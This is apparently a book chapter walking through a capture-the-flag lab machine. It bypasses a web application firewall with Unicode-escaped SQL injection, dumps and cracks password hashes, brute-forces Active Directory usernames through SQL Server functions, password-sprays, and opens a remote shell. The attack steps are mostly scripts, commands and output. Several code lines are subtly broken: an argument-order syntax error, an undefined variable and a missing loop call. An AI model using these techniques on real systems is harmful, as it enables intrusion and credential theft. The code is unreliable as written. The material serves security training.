# Exercise: Bypassing a WAF on Multimaster

We have encountered this machine before when we exploited it using an unintended vulnerability called Zerologon \(see page XX\). This time we will do this the intended way which because the machine was rated as "insane" is quite involved. Multimaster is a Windows box that hosts a website on port 80 called the MegaCorp Employee Hub. Enumeration of the site reveals an API endpoint that allows for the search of staff in the organization. When checking if the API is SQL injectable, the web server \(or rather the WAF\) returns 403 Forbidden errors. Changing the encoding to UTF-16 bypasses the WAF and the API is then SQL injectable. At this point, the MS SQL server can be enumerated manually, or by using sqlmap and a "tamper script" which can bypass the WAF.

An nmap scan returns:

```bash
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 6944F7C42798BE78E1465F1C49B5BF04
| http-methods:
| Supported Methods: GET HEAD OPTIONS TRACE
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp open kerberos-sec Microsoft Windows Kerberos (server 
    time: 2021-01-22 04:41:14Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory 
    LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 
    (workgroup: MEGACORP)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP 
    (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
3389/tcp open ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
| Target_Name: MEGACORP
| NetBIOS_Domain_Name: MEGACORP
| NetBIOS_Computer_Name: MULTIMASTER
| DNS_Domain_Name: MEGACORP.LOCAL
| DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
| DNS_Tree_Name: MEGACORP.LOCAL
| Product_Version: 10.0.14393
|_ System_Time: 2021-01-22T04:42:09+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Issuer: commonName=MULTIMASTER.MEGACORP.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-21T04:33:27
| Not valid after: 2021-07-23T04:33:27
| MD5: 4497 7426 8588 039d 4aa5 8baa 1630 d7bb
|_SHA-1: 2eab 0323 400d 0794 b2f3 3ee1 a964 fffd 0b11 fe80
|_ssl-date: 2021-01-22T04:42:46+00:00; +7m00s from scanner time.
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49675/tcp open msrpc Microsoft Windows RPC
49698/tcp open msrpc Microsoft Windows RPC
49741/tcp open msrpc Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h43m00s, deviation: 3h34m41s, median: 6m59s
| smb-os-discovery:
| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
| Computer name: MULTIMASTER
| NetBIOS computer name: MULTIMASTER\x00
| Domain name: MEGACORP.LOCAL
| Forest name: MEGACORP.LOCAL
| FQDN: MULTIMASTER.MEGACORP.LOCAL
|_ System time: 2021-01-21T20:42:09-08:00
| smb-security-mode:
| account_used: <blank>
| authentication_level: user
| challenge_response: supported
|_ message_signing: required
| smb2-security-mode:
| 2.02:
|_ Message signing enabled and required
| smb2-time:
| date: 2021-01-22T04:42:10
|_ start_date: 2021-01-22T04:33:36
```

The box is a domain controller with the domain MEGACORP.LOCAL. It ias IIS running on port 80 and if we go to the site, we get a site called MegaCorp Empoyee Hub as shown here.

![Home page of Multimaster machine on port 80](../.gitbook/assets/1%20%289%29.png)

Going to the Colleague Finder menu option we find a page that allows for searches uing the search box

![Colleague Finder page with search input box](../.gitbook/assets/2%20%2811%29.png)

Using Burp Suite and sending a search request caught by the proxy interceptor to the repeater, we get the ouput here:

![Colleague Finder page with search input box](../.gitbook/assets/3%20%2810%29.png)

Sending a quote character in the name field results in a "403 Forbidden" being returned. If we encode it as UTF-16 and send the encoded character "\u0027", it comes back with a 200 OK. To confirm that this is injectable, we will send the input "' or 1=1-- -". This will add a clause to the query being used by the application that will always be true and so we would expect all of the results to be returned. To send that, we need to send the encoded form:

"\u0027\u0020\u006f\u0072\u0020\u0031\u003d\u0031\u002d\u002d\u0020\u002d"

Sending this in Burp, we do indeed get all of the results back.

![Results of sending the encoded injection &apos; or 1=1-- -&apos; to Multimaster API endpoint](../.gitbook/assets/4%20%289%29.png)

To enumerate this manually, we are going to write a simple Python 3 script that will set up a command prompt that we can type injections into. The script will take this input and do a POST to the API and then format the response. This will make the entire process much quicker than manually converting the input text and pasting it into Burp. This is the code:

```python
#!/usr/bin/python3

import requests
import json
from cmd import Cmd

RHOST = "http://multimaster.htb/api/getColleagues"

class Terminal(Cmd):

    def __init__(self):
        self.prompt = '> '
        Cmd.__init__(self)

    def default(self, args):
        converted_cmd = ''
        for i in args:
            converted_cmd += "\\u00"+hex(ord(i)).split('x')[1]

        print(f"[*] Sending {converted_cmd}\n")
	      data = "{\"name\": \"" + converted_cmd + "\"}"
        headers = {'Content-Type': 'application/json;charset=utf-8'}
        
        response = requests.post(RHOST, headers=headers, data)
        
        json_response = json.loads(response.text)
        print(json.dumps(json_response, indent=4, sort_keys=True))

terminal = Terminal()

```

The "cmd" module handles the loop and capturing input when entered. It is passed to the default method as the parameter args. The first part of this converts each character in the input into its ASCII code and then appends that to "\u00". The entire string is then sent as part of a JSON request to the server. The response is JSON and we can use the json module in Python to print out the response indented.

The first thing we will do with this is to see how many columns are returned in the query. There are 5 values in the JSON returned normally and so we know that there are at least 5 columns. We can test this by using the injection "' order by 5-- -"

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Multimaster]
└──╼ $./inject.py
> ' order by 5-- -
[*] Sending \u0027\u0020\u006f\u0072\u0064\u0065\u0072\u0020\u0062
            \u0079\u0020\u0035\u002d\u002d\u0020\u002d
[
 {
 "email": "aldom@megacorp.htb",
 "id": 15,
 "name": "Alessandro Dominguez",
 "position": "Senior Web Developer",
 "src": "aldom.jpg"
 },
 {
 "email": "alyx@megacorp.htb",
 "id": 11,
 "name": "Alyx Walters",
 "position": "Automation Engineer",
 "src": "alyx.jpg"
 },
```

That works, so let us try 6:

```bash
> ' order by 6-- -
[*] Sending \u0027\u0020\u006f\u0072\u0064\u0065\u0072\u0020\u0062
            \u0079\u0020\u0036\u002d\u002d\u0020\u002d
null
```

That gave us a null result and so we know that the query being used is only selecting the 5 columns. We can now use a UNION select to submit our own SQL queries. Since this is a Windows box, we can assume that the database is MS SQL Server. Using the Cheat Sheet at PayloadsAllTheThings \(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md\), we can get the database version and database name by using the query:

```bash
> a' union select 1,@@version,db_name(),'4','5'--
[*] Sending \u0074\u0065\u0073\u0074\u0027\u0020\u0075\u006e\u0069
            \u006f\u006e\u0020\u0073\u0065\u006c\u0065\u0063\u0074
            \u0020\u0031\u002c\u0040\u0040\u0076\u0065\u0072\u0073
            \u0069\u006f\u006e\u002c\u0064\u0062\u005f\u006e\u0061
            \u006d\u0065\u0028\u0029\u002c\u0027\u0034\u0027\u002c
            \u0027\u0035\u0027\u002d\u002d
[
 {
 "email": "4",
 "id": 1,
 "name": "Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n\tAug 22 
          2017 17:04:49 \n\tCopyright (C) 2017 Microsoft Corporation\n\tStandard 
          Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> 
          (Build 14393: ) (Hypervisor)\n",
 "position": "Hub_DB",
 "src": "5"
 }
]
```

So we have confirmed that it is SQL Server and the database name is Hub\_DB. We can get the table names from the database using

```bash
> a' UNION SELECT 1,table_name,3,4,5 FROM INFORMATION_SCHEMA.TABLES-- -
…
[
 {
 "email": "4",
 "id": 1,
 "name": "Colleagues",
 "position": "3",
 "src": "5"
 },
 {
 "email": "4",
 "id": 1,
 "name": "Logins",
 "position": "3",
 "src": "5"
 }
]
```

This gives us two tables, Colleauges and Logins. Let's look at Logins and find the column names:

```bash
> a' UNION SELECT 1,name,3,4,5 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name = 'Logins')-- -
…
[
 {
 "email": "4",
 "id": 1,
 "name": "id",
 "position": "3",
 "src": "5"
 },
 {
 "email": "4",
 "id": 1,
 "name": "password",
 "position": "3",
 "src": "5"
 },
 {
 "email": "4",
 "id": 1,
 "name": "username",
 "position": "3",
 "src": "5"
 }
]
```

This returns three columns: id, password and username. We can now select all contents of the database:

```bash
> a' union select 1,username,password,4,5 from logins-- -
…
[
 {
 "email": "4",
 "id": 1,
 "name": "aldom",
 "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
 "src": "5"
 },
 {
 "email": "4",
 "id": 1,
 "name": "alyx",
 "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
 "src": "5"
 },
…
]
```

To make it return just the name and position fields, we can alter the script to just return the username and password fields. So the print code would be

```bash
for resp in json_response:
 print(f"{resp['name']}:{resp['position']}")
And this returns:
> a' union select 1,username,password,4,5 from logins-- -
aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d
      97be2d20d79dbccbe242c2244e5739
alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc8
      0dd2928e648465b8e7a1946a50cfa
ckane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f712
      01fbacc3edb639eed4e954ce5f0813
cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d
      97be2d20d79dbccbe242c2244e5739
egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53ed
      d986b64bf715d0a2df0015fd090babc
…
```

Looking at these hases using an online site, it is identified as possibly Keccak-384 or SHA3-384 or SHA-384. We can use hashcat to try and crack the hashes. The mode for Keccak-384 is 17900 \(you can use hashcat --example-hashes to list all hash types\). If we try that, it succeeds in cracking 3 of them:

```bash
┌─[rin@parrot]─[~/boxes/Multimaster]
└──╼ $hashcat -a 0 -m 17900 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
…
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20
    79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3
    edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928
    e648465b8e7a1946a50cfa:banking1
```

We have found 3 passwords of password1, finance1 and banking1. Getting all of the usernames from the table and usernames from the email addresses of the staff from the website, we can try and password spray each of these passwords with crackmapexec:

```bash
┌─[rin@parrot]─[/home/rin/boxes/Multimaster]
└──╼ #crackmapexec smb multimaster.htb -u users.txt -p passwords.txt
SMB 10.129.1.125 445 MULTIMASTER [*] Windows Server 2016 Standard 14393 x64 
    (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\aldom:password1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\aldom:finance1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\aldom:banking1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\aldom: 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\alyx:password1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\alyx:finance1 
    STATUS_LOGON_FAILURE
<SNIP…>
```

Unfortunately that doesn't work. So we need to find more users. In MS SQL Server, there is a function that allows you to interrogate information about Active Directory users. Namely, we can use SUSER\_SID\('MEGACORP\Administrator'\) to return the SID of a user. Remember from the explanation of a SID that it is made up of the domain SID and the user RID. We can use another function SUSER\_SNAME to take a SID and return a username. This allows us to brute force usernames by incrementing the RID from the value of Administrator which is usually the first user, to a large number. Just to show this working,

```bash
> a' union select 1,2,3,4,master.dbo.fn_varbintohexstr(
      SUSER_SID('MEGACORP\Administrator'))-- -
[
 {
 "email": "4",
 "id": 1,
 "name": "2",
 "position": "3",
 "src": "0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000"
 }
]
```

Of this number, the last 4 bytes are the RID in little endian format. That makes the RID for Administrator 0x01f4 which is 500. We will modify the script we wrote to do the brute force for us. Just to show the reverse side of this, getting a username from the SID, we can use the SID from Administrator as follows:

```bash
> a' union select 1,2,3,4,SUSER_SNAME(0x0105000000000005150000001c00
     d1bcd181f1492bdfc236f4010000)-- -
[
 {
 "email": "4",
 "id": 1,
 "name": "2",
 "position": "3",
 "src": "MEGACORP\\Administrator"
 }
]
```

Modifying the code to create a new script to run through SIDs from 1000 upwards, we get the following code:

```python
#!/usr/bin/python3

import requests
import json
import struct

RHOST = "http://multimaster.htb/api/getColleagues"

def get_sid(n):
    domain_sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
    rid = struct.pack('<I', n).hex()
    return f"{domain_sid}{rid}"

def do_rid():
    starting_rid = 1000

    for i in range(starting_rid, starting_rid+3000):
        sid =  get_sid(i)
        data = "a' union select 1,2,3,4,SUSER_SNAME(" + sid + ")-- -"
        converted_cmd = ''
        for j in data:
            converted_cmd += "\\u00"+hex(ord(j)).split('x')[1]

        encoded_data = "{\"name\": \"" + converted_cmd + "\"}" 
        headers = {'Content-Type': 'application/json;charset=utf-8'}
        response = requests.post(RHOST, 
                                 headers=headers,
                                 data=converted_data
				    )
            
        try:
            json_response = json.loads(response.text)

            for resp in json_response:
                if resp['src'] != '':
                    print(f"{i}:  {resp['src']}")
        except:
            pass
do_rid()

```

This gives us the following usernames:

```bash
┌─[rin@parrot]─[~/boxes/Multimaster]
└──╼ $./bruterid.py
1000: MEGACORP\MULTIMASTER$
1101: MEGACORP\DnsAdmins
1102: MEGACORP\DnsUpdateProxy
1103: MEGACORP\svc-nas
1105: MEGACORP\Privileged IT Accounts
1110: MEGACORP\tushikikatomo
1111: MEGACORP\andrew
1112: MEGACORP\lana
1601: MEGACORP\alice
1602: MEGACORP\test
```

Retrying the previously found passwords with these users, we get a hit with user tushikikatomo and password finance1:

```bash
┌─[rin@parrot]─[~/boxes/Multimaster]
└──╼ $crackmapexec smb multimaster.htb -u users.txt -p passwords.txt
SMB 10.129.1.125 445 MULTIMASTER [*] Windows Server 2016 Standard 14393 x64 
    (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\svc-nas:password1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\svc-nas:finance1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\svc-nas:banking1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\svc-nas: 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [-] MEGACORP.LOCAL\tushikikatomo:password1 
    STATUS_LOGON_FAILURE
SMB 10.129.1.125 445 MULTIMASTER [+] MEGACORP.LOCAL\tushikikatomo:finance1
```

Using evil-winrm, we can finally get on the box with those credentials:

```bash
┌─[rin@parrot]─[~/boxes/Multimaster]
└──╼ $evil-winrm -u tushikikatomo -p 'finance1' -i multimaster.htb
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alcibiades\Documents>
```

We will leave this machine there as there is still a way to go to get to root and it is not relevant to the current chapter



